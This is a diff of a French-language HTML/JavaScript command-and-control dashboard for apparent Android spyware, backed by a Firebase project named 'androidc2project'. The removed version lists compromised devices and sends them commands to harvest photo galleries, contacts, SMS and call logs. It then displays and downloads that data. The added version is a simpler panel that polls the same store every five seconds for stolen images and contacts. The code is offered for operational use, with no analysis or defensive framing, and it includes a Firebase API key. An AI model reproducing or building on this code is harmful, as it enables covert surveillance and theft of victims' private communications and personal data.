@@ -1,287 +1,132 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C2 Dashboard</title>
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-storage-compat.js"></script>
+    <title>Dashboard</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
-        body { background: #0a0e1a; color: #e0e0e0; min-height: 100vh; }
-        .header { background: linear-gradient(135deg, #1a1f3a, #0d1225); padding: 18px 30px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #2a2f4a; }
-        .header h1 { font-size: 22px; color: #00d4ff; }
-        .header .stats span { margin-left: 20px; color: #889; font-size: 14px; }
-        .header .stats strong { color: #00ff88; }
-        .container { display: flex; height: calc(100vh - 65px); }
-        .sidebar { width: 280px; background: #111627; border-right: 1px solid #1e2340; overflow-y: auto; flex-shrink: 0; }
-        .sidebar h3 { padding: 15px 20px; font-size: 13px; color: #667; text-transform: uppercase; letter-spacing: 1px; }
-        .device-item { padding: 12px 20px; cursor: pointer; border-left: 3px solid transparent; transition: all 0.2s; border-bottom: 1px solid #1a1f35; }
-        .device-item:hover { background: #1a1f35; }
-        .device-item.active { border-left-color: #00d4ff; background: #1a2040; }
-        .device-item .name { font-size: 14px; color: #ddd; }
-        .device-item .info { font-size: 11px; color: #667; margin-top: 3px; }
-        .status-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 8px; }
-        .status-dot.online { background: #00ff88; }
-        .status-dot.offline { background: #ff4444; }
-        .main-panel { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
-        .toolbar { padding: 12px 20px; background: #13182e; display: flex; gap: 10px; flex-wrap: wrap; border-bottom: 1px solid #1e2340; }
-        .toolbar button { padding: 8px 18px; border: 1px solid #2a3050; background: #1a1f3a; color: #ccc; border-radius: 6px; cursor: pointer; font-size: 13px; }
-        .toolbar button:hover { background: #2a3050; color: #fff; }
-        .toolbar button.primary { background: #0055aa; border-color: #0066cc; color: #fff; }
-        .toolbar button.primary:hover { background: #0066cc; }
-        .toolbar button.danger { background: #661122; border-color: #882233; color: #ff6677; }
-        .toolbar button.danger:hover { background: #882233; }
-        .content { flex: 1; padding: 20px; overflow-y: auto; }
-        .tab-bar { display: flex; gap: 2px; margin-bottom: 15px; border-bottom: 1px solid #1e2340; }
-        .tab-item { padding: 10px 20px; cursor: pointer; font-size: 13px; color: #889; border-bottom: 2px solid transparent; }
-        .tab-item:hover { color: #ddd; }
-        .tab-item.active { color: #00d4ff; border-bottom-color: #00d4ff; }
-        .tab-content { display: none; }
-        .tab-content.active { display: block; }
-        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 12px; }
-        .gallery-item { position: relative; background: #13182e; border-radius: 8px; overflow: hidden; border: 1px solid #1e2340; }
-        .gallery-item:hover { border-color: #3a4060; }
-        .gallery-item img { width: 100%; height: 160px; object-fit: cover; display: block; }
-        .gallery-item .info { padding: 8px 10px; font-size: 11px; color: #889; }
-        .gallery-item .info .name { color: #ddd; font-size: 12px; margin-bottom: 3px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-        .gallery-item .checkbox-overlay { position: absolute; top: 8px; right: 8px; width: 22px; height: 22px; background: rgba(0,0,0,0.6); border-radius: 4px; display: flex; align-items: center; justify-content: center; }
-        .gallery-item .checkbox-overlay input { transform: scale(1.2); cursor: pointer; }
-        .gallery-item .download-btn { position: absolute; bottom: 40px; right: 8px; background: rgba(0,85,170,0.8); color: #fff; border: none; padding: 4px 10px; border-radius: 4px; font-size: 11px; cursor: pointer; display: none; }
-        .gallery-item:hover .download-btn { display: block; }
-        .gallery-select-actions { padding: 10px 0; display: flex; gap: 10px; align-items: center; }
-        .gallery-select-actions button { padding: 6px 14px; border: 1px solid #2a3050; background: #1a1f3a; color: #ddd; border-radius: 4px; cursor: pointer; font-size: 12px; }
-        .gallery-select-actions button:hover { background: #2a3050; }
-        .gallery-select-actions .count { color: #889; font-size: 13px; }
-        .data-table { width: 100%; border-collapse: collapse; font-size: 13px; }
-        .data-table th { text-align: left; padding: 10px 12px; background: #1a1f35; color: #889; font-weight: 500; text-transform: uppercase; font-size: 11px; }
-        .data-table td { padding: 8px 12px; border-bottom: 1px solid #1a1f35; }
-        .data-table tr:hover td { background: #141a30; }
-        .loading { text-align: center; padding: 40px; color: #667; }
-        .stats-cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 12px; margin-bottom: 20px; }
-        .stat-card { background: #13182e; border: 1px solid #1e2340; border-radius: 8px; padding: 15px; text-align: center; }
-        .stat-card .value { font-size: 28px; font-weight: 700; color: #00d4ff; }
-        .stat-card .label { font-size: 12px; color: #667; margin-top: 4px; }
-        .modal-overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); z-index: 100; align-items: center; justify-content: center; }
-        .modal-overlay.show { display: flex; }
-        .modal { background: #1a1f3a; border-radius: 12px; padding: 25px; max-width: 600px; width: 90%; max-height: 80vh; overflow-y: auto; border: 1px solid #2a3050; }
-        .modal h2 { margin-bottom: 15px; font-size: 18px; }
-        .modal img { max-width: 100%; border-radius: 8px; margin-bottom: 15px; }
-        .modal .info-row { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid #1e2340; font-size: 13px; }
-        .modal .info-row .label { color: #889; }
-        .modal .btn-close { margin-top: 15px; padding: 8px 20px; background: #2a3050; color: #ddd; border: none; border-radius: 6px; cursor: pointer; }
-        .modal .btn-download { padding: 8px 20px; background: #0055aa; color: #fff; border: none; border-radius: 6px; cursor: pointer; margin-right: 10px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial; background: #0f0f23; color: #fff; padding: 20px; }
+        h1 { text-align: center; margin-bottom: 20px; color: #00ff88; }
+        .stats { display: flex; gap: 15px; justify-content: center; margin-bottom: 25px; flex-wrap: wrap; }
+        .stat-box { background: #1a1a3e; padding: 15px 25px; border-radius: 10px; text-align: center; min-width: 120px; }
+        .stat-box h3 { font-size: 14px; color: #888; }
+        .stat-box p { font-size: 28px; font-weight: bold; color: #00ff88; }
+        .section { margin-bottom: 30px; }
+        .section h2 { color: #ffcc00; margin-bottom: 10px; border-bottom: 1px solid #333; padding-bottom: 5px; }
+        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 10px; }
+        .gallery-grid img { width: 100%; height: 200px; object-fit: cover; border-radius: 8px; border: 2px solid #333; cursor: pointer; }
+        .gallery-grid img:hover { border-color: #00ff88; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { padding: 8px 12px; text-align: left; border-bottom: 1px solid #333; }
+        th { background: #1a1a3e; color: #ffcc00; }
+        tr:hover { background: #1a1a3e; }
+        .status { text-align: center; padding: 10px; background: #1a1a3e; border-radius: 8px; margin-bottom: 20px; }
+        .status.ok { border-left: 4px solid #00ff88; }
+        .status.err { border-left: 4px solid #ff4444; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; z-index: 999; }
+        .modal img { max-width: 90%; max-height: 90%; }
+        .modal .close { position: absolute; top: 20px; right: 30px; color: #fff; font-size: 40px; cursor: pointer; }
+        @media (max-width: 600px) { .gallery-grid { grid-template-columns: repeat(2, 1fr); } }
     </style>
 </head>
 <body>
-    <div class="header">
-    <h1>C2 Dashboard</h1>
+    <h1>📱 Android Dashboard</h1>
     <div class="stats">
-        <span>Devices: <strong id="deviceCount">0</strong></span>
-        <span>Photos: <strong id="totalPhotos">0</strong></span>
-        <span>Contacts: <strong id="totalContacts">0</strong></span>
+        <div class="stat-box"><h3>Photos</h3><p id="photoCount">0</p></div>
+        <div class="stat-box"><h3>Contacts</h3><p id="contactCount">0</p></div>
+        <div class="stat-box"><h3>Statut</h3><p id="statusText">...</p></div>
     </div>
-</div>
-<div class="container">
-    <div class="sidebar" id="sidebar">
-        <h3>Devices connectes</h3>
-        <div id="deviceList"><div class="loading">Recherche...</div></div>
-    </div>
-    <div class="main-panel">
-        <div class="toolbar" id="toolbar">
-            <button class="primary" onclick="scanGallery()">Scanner Gallerie</button>
-            <button class="primary" onclick="scanContacts()">Scanner Contacts</button>
-            <button class="primary" onclick="scanSMS()">Scanner SMS</button>
-            <button class="primary" onclick="scanCalls()">Appels</button>
-            <button class="danger" onclick="scanAll()">Scan Complet</button>
-            <span style="color:#667;font-size:13px;margin-left:auto;" id="selectedDeviceLabel">Aucun device selectionne</span>
-        </div>
-        <div class="content" id="content">
-            <div id="deviceStats" style="display:none;">
-                <div class="stats-cards" id="statsCards"></div>
-            </div>
-            <div class="tab-bar" id="tabBar" style="display:none;">
-                <div class="tab-item active" onclick="switchTab('gallery')">Gallerie</div>
-                <div class="tab-item" onclick="switchTab('contacts')">Contacts</div>
-                <div class="tab-item" onclick="switchTab('sms')">SMS</div>
-                <div class="tab-item" onclick="switchTab('calls')">Appels</div>
-            </div>
-            <div class="tab-content active" id="tab-gallery">
-                <div class="gallery-select-actions">
-                    <button onclick="selectAllPhotos()">Tout selectionner</button>
-                    <button onclick="deselectAllPhotos()">Tout deselectionner</button>
-                    <button class="primary" onclick="downloadSelected()">Telecharger selection</button>
-                    <span class="count" id="selectedCount">0 selectionnee(s)</span>
-                </div>
-                <div class="gallery-grid" id="galleryGrid">
-                    <div class="loading">Chargement de la gallerie...</div>
-                </div>
-            </div>
-            <div class="tab-content" id="tab-contacts">
-                <div style="margin-bottom:10px;">
-                    <button class="primary" onclick="downloadContactsCSV()">Exporter CSV</button>
-                </div>
-                <div id="contactsTable"></div>
-            </div>
-            <div class="tab-content" id="tab-sms">
-                <div id="smsTable"></div>
-            </div>
-            <div class="tab-content" id="tab-calls">
-                <div id="callsTable"></div>
-            </div>
-        </div>
-    </div>
-</div>
-<div class="modal-overlay" id="photoModal">
-    <div class="modal">
-        <h2 id="modalTitle">Photo</h2>
-        <img id="modalImage" src="" alt="">
-        <div id="modalInfo"></div>
-        <div style="margin-top:15px;">
-            <button class="btn-download" id="modalDownloadBtn" onclick="downloadModalPhoto()">Telecharger</button>
-            <button class="btn-close" onclick="closeModal()">Fermer</button>
-        </div>
-    </div>
-</div>
-<script>
-const firebaseConfig = {
-    apiKey: "AIzaSyAsFCpjSNUF4XdteSJSUHes6307L8PzneE",
-    authDomain: "androidc2project.firebaseapp.com",
-    databaseURL: "https://androidc2project-default-rtdb.firebaseio.com",
-    storageBucket: "androidc2project.appspot.com",
-    projectId: "androidc2project"
-};
+    <div class="status" id="statusBar">En attente des données...</div>
 
-firebase.initializeApp(firebaseConfig);
-const db = firebase.database();
-const storage = firebase.storage();
+    <div class="section">
+        <h2>📸 Galerie</h2>
+        <div class="gallery-grid" id="gallery"></div>
+    </div>
 
-let selectedDeviceId = null;
-let currentGallery = [];
-let selectedPhotos = new Set();
-let deviceListeners = {};
+    <div class="section">
+        <h2>👤 Contacts</h2>
+        <table><thead><tr><th>#</th><th>Nom</th><th>Téléphone</th></tr></thead><tbody id="contacts"></tbody></table>
+    </div>
 
-function loadDevices() {
-    db.ref('devices').on('value', (snapshot) => {
-        const devices = snapshot.val();
-        const deviceList = document.getElementById('deviceList');
-        deviceList.innerHTML = '';
-        let count = 0;
-        if (!devices) {
-            deviceList.innerHTML = '<div style="padding:20px;color:#667;">Aucun device trouve</div>';
-            document.getElementById('deviceCount').textContent = '0';
-            return;
+    <div class="modal" id="imageModal" onclick="closeModal()">
+        <span class="close">&times;</span>
+        <img id="modalImage">
+    </div>
+
+    <script>
+        const DB_URL = "https://androidc2project-default-rtdb.firebaseio.com";
+        const STORAGE_URL = "https://firebasestorage.googleapis.com/v0/b/androidc2project.appspot.com/o";
+
+        function openModal(src) { document.getElementById("modalImage").src = src; document.getElementById("imageModal").style.display = "flex"; }
+        function closeModal() { document.getElementById("imageModal").style.display = "none"; }
+
+        async function loadData() {
+            try {
+                // Statut
+                let res = await fetch(DB_URL + "/status.json");
+                let status = await res.json();
+                let bar = document.getElementById("statusBar");
+                if (status) { bar.textContent = status; bar.className = "status ok"; }
+                document.getElementById("statusText").textContent = status || "...";
+
+                // Gallery metadata
+                res = await fetch(DB_URL + "/gallery.json");
+                let gallery = await res.json();
+                let galleryDiv = document.getElementById("gallery");
+                galleryDiv.innerHTML = "";
+                let count = 0;
+
+                if (gallery) {
+                    let keys = Object.keys(gallery).sort((a,b) => parseInt(b) - parseInt(a));
+                    for (let key of keys) {
+                        let item = gallery[key];
+                        let imgSrc = STORAGE_URL + "/gallery%2F" + encodeURIComponent(item.filename || ("img_" + key + ".jpg")) + "?alt=media";
+                        let div = document.createElement("div");
+                        let img = document.createElement("img");
+                        img.src = imgSrc;
+                        img.onerror = function() {
+                            // Fallback: afficher le base64
+                            if (item.data && item.data.length > 100) {
+                                this.src = "data:image/jpeg;base64," + item.data;
+                            } else {
+                                this.src = ""; this.alt = "Image indisponible";
+                                this.style.opacity = "0.3";
+                            }
+                        };
+                        img.onclick = function() { openModal(this.src); };
+                        div.appendChild(img);
+                        galleryDiv.appendChild(div);
+                        count++;
+                    }
+                }
+                document.getElementById("photoCount").textContent = count;
+
+                // Contacts
+                res = await fetch(DB_URL + "/contacts.json");
+                let contacts = await res.json();
+                let tbody = document.getElementById("contacts");
+                tbody.innerHTML = "";
+                let ccount = 0;
+                if (contacts) {
+                    for (let key in contacts) {
+                        let c = contacts[key];
+                        let tr = document.createElement("tr");
+                        tr.innerHTML = "<td>" + (parseInt(key)+1) + "</td><td>" + (c.name || "Inconnu") + "</td><td>" + (c.phone || "-") + "</td>";
+                        tbody.appendChild(tr);
+                        ccount++;
+                    }
+                }
+                document.getElementById("contactCount").textContent = ccount;
+
+            } catch(e) {
+                document.getElementById("statusBar").textContent = "Erreur: " + e.message;
+                document.getElementById("statusBar").className = "status err";
+            }
         }
-        Object.keys(devices).forEach(deviceId => {
-            const device = devices[deviceId];
-            count++;
-            const div = document.createElement('div');
-            div.className = 'device-item' + (deviceId === selectedDeviceId ? ' active' : '');
-            div.innerHTML = '<div class="name"><span class="status-dot ' + (device.online ? 'online' : 'offline') + '"></span>' + (device.device_name || 'Inconnu') + '</div><div class="info">' + deviceId.substring(0,12) + '... | ' + (device.last_seen ? new Date(device.last_seen).toLocaleTimeString() : '?') + '</div>';
-            div.onclick = () => selectDevice(deviceId);
-            deviceList.appendChild(div);
-        });
-        document.getElementById('deviceCount').textContent = count;
-        if (!selectedDeviceId && Object.keys(devices).length > 0) {
-            selectDevice(Object.keys(devices)[0]);
-        }
-    });
-}
 
-function selectDevice(deviceId) {
-    selectedDeviceId = deviceId;
-    document.querySelectorAll('.device-item').forEach(el => el.classList.remove('active'));
-    document.getElementById('selectedDeviceLabel').textContent = 'Device: ' + deviceId.substring(0,16) + '...';
-    document.getElementById('deviceStats').style.display = 'block';
-    document.getElementById('tabBar').style.display = 'flex';
-    Object.values(deviceListeners).forEach(l => l());
-    deviceListeners = {};
-    loadGallery(deviceId);
-    loadContacts(deviceId);
-    loadSMS(deviceId);
-    loadCalls(deviceId);
-    loadStats(deviceId);
-}
-
-function loadStats(deviceId) {
-    deviceListeners['gallery_count'] = db.ref('devices/' + deviceId + '/gallery_count').on('value', (snap) => { updateStat('Photos', snap.val() || 0); });
-    deviceListeners['contacts_count'] = db.ref('devices/' + deviceId + '/contacts_count').on('value', (snap) => { updateStat('Contacts', snap.val() || 0); });
-    deviceListeners['sms_count'] = db.ref('devices/' + deviceId + '/sms_count').on('value', (snap) => { updateStat('SMS', snap.val() || 0); });
-    deviceListeners['calls_count'] = db.ref('devices/' + deviceId + '/calls_count').on('value', (snap) => { updateStat('Appels', snap.val() || 0); });
-    document.getElementById('statsCards').innerHTML = '<div class="stat-card"><div class="value">-</div><div class="label">Device</div></div><div class="stat-card"><div class="value" id="statPhotos">0</div><div class="label">Photos</div></div><div class="stat-card"><div class="value" id="statContacts">0</div><div class="label">Contacts</div></div><div class="stat-card"><div class="value" id="statSMS">0</div><div class="label">SMS</div></div><div class="stat-card"><div class="value" id="statCalls">0</div><div class="label">Appels</div></div>';
-}
-
-function updateStat(label, value) {
-    const map = {'Photos':'statPhotos','Contacts':'statContacts','SMS':'statSMS','Appels':'statCalls'};
-    const el = document.getElementById(map[label]);
-    if (el) el.textContent = value;
-    if (label === 'Photos') document.getElementById('totalPhotos').textContent = value;
-    if (label === 'Contacts') document.getElementById('totalContacts').textContent = value;
-}
-    function loadGallery(deviceId) {
-    const grid = document.getElementById('galleryGrid');
-    grid.innerHTML = '<div class="loading">Chargement...</div>';
-    deviceListeners['gallery'] = db.ref('devices/' + deviceId + '/gallery').on('value', (snapshot) => {
-        const photos = snapshot.val();
-        grid.innerHTML = '';
-        currentGallery = [];
-        selectedPhotos.clear();
-        updateSelectedCount();
-        if (!photos || photos.length === 0) { grid.innerHTML = '<div style="padding:20px;color:#667;">Aucune photo. Lancez un scan.</div>'; return; }
-        photos.forEach((photo, index) => {
-            if (!photo || !photo.path) return;
-            currentGallery.push(photo);
-            const storagePath = photo.storage_url || 'gallery/' + deviceId + '/' + photo.name;
-            const photoRef = storage.ref(storagePath);
-            const item = document.createElement('div');
-            item.className = 'gallery-item';
-            const img = document.createElement('img');
-            img.alt = photo.name || 'Photo';
-            img.style.cursor = 'pointer';
-            photoRef.getDownloadURL().then(url => { img.src = url; }).catch(() => { img.src = ''; });
-            img.onclick = () => openPhotoModal(photo, index);
-            const info = document.createElement('div');
-            info.className = 'info';
-            const nameSpan = document.createElement('div');
-            nameSpan.className = 'name';
-            nameSpan.textContent = photo.name || 'sans_nom';
-            info.appendChild(nameSpan);
-            const cb = document.createElement('div');
-            cb.className = 'checkbox-overlay';
-            const chk = document.createElement('input');
-            chk.type = 'checkbox';
-            chk.onchange = (e) => { if (e.target.checked) selectedPhotos.add(index); else selectedPhotos.delete(index); updateSelectedCount(); };
-            cb.appendChild(chk);
-            const dl = document.createElement('button');
-            dl.className = 'download-btn';
-            dl.textContent = 'DL';
-            dl.onclick = (e) => { e.stopPropagation(); downloadPhoto(photo, index); };
-            item.appendChild(img); item.appendChild(info); item.appendChild(cb); item.appendChild(dl);
-            grid.appendChild(item);
-        });
-    });
-}
-
-function updateSelectedCount() { document.getElementById('selectedCount').textContent = selectedPhotos.size + ' selectionnee(s)'; }
-function selectAllPhotos() { selectedPhotos.clear(); currentGallery.forEach((_, i) => selectedPhotos.add(i)); document.querySelectorAll('.gallery-item input').forEach(cb => cb.checked = true); updateSelectedCount(); }
-function deselectAllPhotos() { selectedPhotos.clear(); document.querySelectorAll('.gallery-item input').forEach(cb => cb.checked = false); updateSelectedCount(); }
-function downloadPhoto(photo, index) { if (!selectedDeviceId) return; const p = photo.storage_url || 'gallery/' + selectedDeviceId + '/' + photo.name; storage.ref(p).getDownloadURL().then(url => { window.open(url, '_blank'); }).catch(() => { alert("Demande envoyee"); }); }
-function downloadSelected() { if (selectedPhotos.size === 0) { alert('Selectionnez des photos'); return; } selectedPhotos.forEach(i => { const p = currentGallery[i]; if (p) setTimeout(() => downloadPhoto(p, i), i * 300); }); }
-function openPhotoModal(photo, index) { document.getElementById('modalTitle').textContent = photo.name || 'Photo'; const p = photo.storage_url || 'gallery/' + selectedDeviceId + '/' + photo.name; storage.ref(p).getDownloadURL().then(url => { document.getElementById('modalImage').src = url; }); document.getElementById('modalInfo').innerHTML = '<div class="info-row"><span class="label">Nom</span><span>' + (photo.name || '-') + '</span></div><div class="info-row"><span class="label">Date</span><span>' + (photo.date || '-') + '</span></div><div class="info-row"><span class="label">Chemin</span><span style="font-size:11px;color:#667;">' + (photo.path || '-') + '</span></div>'; document.getElementById('photoModal').classList.add('show'); }
-function closeModal() { document.getElementById('photoModal').classList.remove('show'); }
-function downloadModalPhoto() { const p = currentGallery[modalPhotoIndex]; if (p) downloadPhoto(p, modalPhotoIndex); }
-function loadContacts(deviceId) { const c = document.getElementById('contactsTable'); c.innerHTML = '<div class="loading">Chargement...</div>'; deviceListeners['contacts'] = db.ref('devices/' + deviceId + '/contacts').on('value', (snap) => { const d = snap.val(); if (!d || !Array.isArray(d) || d.length === 0) { c.innerHTML = '<div style="padding:20px;color:#667;">Aucun contact.</div>'; return; } let h = '<table class="data-table"><thead><tr><th>#</th><th>Nom</th><th>Numero</th></tr></thead><tbody>'; d.forEach((x, i) => { h += '<tr><td>' + (i+1) + '</td><td>' + (x.name || '-') + '</td><td>' + (x.number || '-') + '</td></tr>'; }); h += '</tbody></table>'; c.innerHTML = h; }); }
-function loadSMS(deviceId) { const c = document.getElementById('smsTable'); c.innerHTML = '<div class="loading">Chargement...</div>'; deviceListeners['sms'] = db.ref('devices/' + deviceId + '/sms').on('value', (snap) => { const d = snap.val(); if (!d || !Array.isArray(d) || d.length === 0) { c.innerHTML = '<div style="padding:20px;color:#667;">Aucun SMS.</div>'; return; } let h = '<table class="data-table"><thead><tr><th>#</th><th>De</th><th>Message</th><th>Date</th></tr></thead><tbody>'; d.slice(0,200).forEach((x, i) => { const b = x.body ? x.body.substring(0,80) + (x.body.length > 80 ? '...' : '') : '-'; h += '<tr><td>' + (i+1) + '</td><td>' + (x.from || '-') + '</td><td style="max-width:300px;overflow:hidden;">' + b + '</td><td>' + (x.date ? new Date(x.date).toLocaleString() : '-') + '</td></tr>'; }); h += '</tbody></table>'; c.innerHTML = h; }); }
-function loadCalls(deviceId) { const c = document.getElementById('callsTable'); c.innerHTML = '<div class="loading">Chargement...</div>'; deviceListeners['calls'] = db.ref('devices/' + deviceId + '/calls').on('value', (snap) => { const d = snap.val(); if (!d || !Array.isArray(d) || d.length === 0) { c.innerHTML = '<div style="padding:20px;color:#667;">Aucun appel.</div>'; return; } let h = '<table class="data-table"><thead><tr><th>#</th><th>Type</th><th>Numero</th><th>Nom</th><th>Duree</th><th>Date</th></tr></thead><tbody>'; d.slice(0,200).forEach((x, i) => { h += '<tr><td>' + (i+1) + '</td><td>' + (x.type || '-') + '</td><td>' + (x.number || '-') + '</td><td>' + (x.name || '-') + '</td><td>' + (x.duration || '0') + 's</td><td>' + (x.date ? new Date(x.date).toLocaleString() : '-') + '</td></tr>'; }); h += '</tbody></table>'; c.innerHTML = h; }); }
-function downloadContactsCSV() { if (!selectedDeviceId) return; db.ref('devices/' + selectedDeviceId + '/contacts').once('value', (snap) => { const d = snap.val(); if (!d || !Array.isArray(d)) return; let csv = 'Nom,Numero\n'; d.forEach(x => { csv += '"' + (x.name || '') + '","' + (x.number || '') + '"\n'; }); const b = new Blob([csv], {type:'text/csv'}); const u = URL.createObjectURL(b); const a = document.createElement('a'); a.href = u; a.download = 'contacts_' + selectedDeviceId.substring(0,8) + '.csv'; a.click(); }); }
-function scanGallery() { if (!selectedDeviceId) { alert('Selectionnez un device'); return; } db.ref('devices/' + selectedDeviceId + '/commands').push({type:"scan_gallery", id:"gallery_" + Date.now()}); alert('Scan gallerie envoye !'); }
-function scanContacts() { if (!selectedDeviceId) { alert('Selectionnez un device'); return; } db.ref('devices/' + selectedDeviceId + '/commands').push({type:"scan_contacts", id:"contacts_" + Date.now()}); alert('Scan contacts envoye !'); }
-function scanSMS() { if (!selectedDeviceId) { alert('Selectionnez un device'); return; } db.ref('devices/' + selectedDeviceId + '/commands').push({type:"scan_sms", id:"sms_" + Date.now()}); alert('Scan SMS envoye !'); }
-function scanCalls() { if (!selectedDeviceId) { alert('Selectionnez un device'); return; } db.ref('devices/' + selectedDeviceId + '/commands').push({type:"scan_call_log", id:"calls_" + Date.now()}); alert('Scan appels envoye !'); }
-function scanAll() { if (!selectedDeviceId) { alert('Selectionnez un device'); return; } db.ref('devices/' + selectedDeviceId + '/commands').push({type:"scan_all", id:"all_" + Date.now()}); document.getElementById('galleryGrid').innerHTML = '<div class="loading">Scan complet en cours...</div>'; alert('Scan complet envoye !'); }
-function switchTab(tab) { document.querySelectorAll('.tab-item').forEach(t => t.classList.remove('active')); document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active')); document.querySelector('.tab-item[onclick="switchTab(\'' + tab + '\')"]').classList.add('active'); document.getElementById('tab-' + tab).classList.add('active'); }
-loadDevices();
-</script>
+        loadData();
+        setInterval(loadData, 5000);
+    </script>
 </body>
 </html>
